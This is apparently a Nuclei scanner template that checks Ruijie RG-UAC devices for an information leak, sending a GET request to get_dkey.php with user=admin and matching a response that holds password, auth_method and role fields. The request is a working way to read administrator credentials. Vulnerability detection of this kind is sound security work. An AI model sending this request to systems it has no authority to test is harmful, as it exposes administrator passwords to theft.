id: ruijie-rg-uac-password-leak
info:
  name: Ruijie RG-UAC get_dkey.php Information Disclosure
  author: ProjectDiscoveryAI
  severity: medium
  tags: info-leak,ruijie
http:
  - method: GET
    path:
      - "{{BaseURL}}/get_dkey.php?user=admin"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"password\":"
          - "\"auth_method\":"
          - "\"role\""
          - "\"pre_define\""
